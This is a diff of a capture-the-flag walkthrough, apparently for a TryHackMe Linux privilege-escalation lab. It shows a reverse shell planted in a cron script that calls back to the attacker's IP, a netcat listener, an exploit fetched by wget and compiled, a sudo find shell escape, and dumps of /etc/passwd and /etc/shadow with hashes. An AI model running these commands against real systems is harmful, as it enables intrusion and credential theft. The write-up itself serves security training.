@@ -38,11 +38,11 @@ Python 2.7.6
 ```bash
 $ ssh karen@<MACHINE_IP>
 karen@<MACHINE_IP> password: Password1
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'from pty import spawn; spawn("/bin/bash")'
 karen@wade7363:/home/matt$ cd /tmp
 karen@wade7363:/tmp$ wget http://<OPENVPN_IP>/ofs.c -O ofs.ckaren@wade7363:/tmp$ gcc -o ofs ofs.c
 karen@wade7363:/tmp$ ./ofs
-# cat /python3 -c 'import pty; pty.spawn("/bin/bash")'
+# cat /python3 -c 'from pty import spawn; spawn("/bin/bash")'
 root@wade7363:/tmp# cat /home/matt/flag1.txt 
 THM-28392872729920
 ```
@@ -53,7 +53,7 @@ THM-28392872729920
 ```bash
 $ ssh karen@<MACHINE_IP>
 karen@<MACHINE_IP> password: Password1
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'from pty import spawn; spawn("/bin/bash")'
 karen@ip-10-10-123-126:/$ sudo -l
 Matching Defaults entries for karen on ip-10-10-123-126:
     env_reset, mail_badpass,
@@ -70,7 +70,7 @@ User karen may run the following commands on ip-10-10-123-126:
 
 ```bash
 karen@ip-10-10-123-126:/$ sudo find . -exec /bin/sh \; -quit
-# python3 -c 'import pty; pty.spawn("/bin/bash")'
+# python3 -c 'from pty import spawn; spawn("/bin/bash")'
 root@ip-10-10-123-126:/# cat /home/ubuntu/flag2.txt 
 THM-402028394
 ```
@@ -127,7 +127,7 @@ frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelW
 ```bash
 $ ssh karen@<MACHINE_IP>
 karen@<MACHINE_IP> password: Password1
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'from pty import spawn; spawn("/bin/bash")'
 karen@ip-10-10-182-233:/$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -286,7 +286,7 @@ Candidates.#2....: theking -> gemini1
 ```bash
 karen@ip-10-10-182-233:/$ su user2
 Password: Password1
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'from pty import spawn; spawn("/bin/bash")'
 user2@ip-10-10-182-233:/$ base64 /home/ubuntu/flag3.txt | base64 --decode
 THM-3847834
 ```
@@ -296,7 +296,7 @@ THM-3847834
 ```bash
 $ ssh karen@<MACHINE_IP>
 karen@<MACHINE_IP> password: Password1
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'from pty import spawn; spawn("/bin/bash")'
 karen@ip-10-10-108-224:~$ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 /usr/bin/traceroute6.iputils = cap_net_raw+ep
@@ -322,7 +322,7 @@ THM-9349843
 ```bash
 $ ssh karen@<MACHINE_IP>
 karen@<MACHINE_IP> password: Password1
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'from pty import spawn; spawn("/bin/bash")'
 karen@ip-10-10-30-209:~$ cat /etc/crontab 
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -357,7 +357,57 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 1. Edit `backup.sh` with `nano` or your preferred editor:
 ```bash
 #!/bin/bash
-
 bash -i >& /dev/tcp/<OPENVPN_IP>/1234 0>&1
 ```
+2. Make sure that `backup.sh` can be executed with `chmod +x backup.sh`.
+3. Run `nc -lvnp 1234` and wait for beginning of the next minute:
+```bash
+$ nc -lvnp 1234
+root@ip-10-10-118-61:~# cat /home/ubuntu/flag5.txt
+cat /home/ubuntu/flag5.txt
+THM-383000283
+```
+
+**Flag 5**: `THM-383000283`
 ### What is Matt's password?
+
+```bash
+root@ip-10-10-118-61:~# cat /etc/shadow
+root:*:18561:0:99999:7:::
+daemon:*:18561:0:99999:7:::
+bin:*:18561:0:99999:7:::
+sys:*:18561:0:99999:7:::
+sync:*:18561:0:99999:7:::
+games:*:18561:0:99999:7:::
+man:*:18561:0:99999:7:::
+lp:*:18561:0:99999:7:::
+mail:*:18561:0:99999:7:::
+news:*:18561:0:99999:7:::
+uucp:*:18561:0:99999:7:::
+proxy:*:18561:0:99999:7:::
+www-data:*:18561:0:99999:7:::
+backup:*:18561:0:99999:7:::
+list:*:18561:0:99999:7:::
+irc:*:18561:0:99999:7:::
+gnats:*:18561:0:99999:7:::
+nobody:*:18561:0:99999:7:::
+systemd-network:*:18561:0:99999:7:::
+systemd-resolve:*:18561:0:99999:7:::
+systemd-timesync:*:18561:0:99999:7:::
+messagebus:*:18561:0:99999:7:::
+syslog:*:18561:0:99999:7:::
+_apt:*:18561:0:99999:7:::
+tss:*:18561:0:99999:7:::
+uuidd:*:18561:0:99999:7:::
+tcpdump:*:18561:0:99999:7:::
+sshd:*:18561:0:99999:7:::
+landscape:*:18561:0:99999:7:::
+pollinate:*:18561:0:99999:7:::
+ec2-instance-connect:!:18561:0:99999:7:::
+systemd-coredump:!!:18798::::::
+ubuntu:!:18798:0:99999:7:::
+karen:$6$ZC4srkt5HufYpAAb$GVDM6arO/qQU.o0kLOZfMLAFGNHXULH5bLlidB455aZkKrMvdB1upyMZZzqdZuzlJTuTHTlsKzQAbSZJr9iE21:18798:0:99999:7:::
+lxd:!:18798::::::
+matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
+```
+
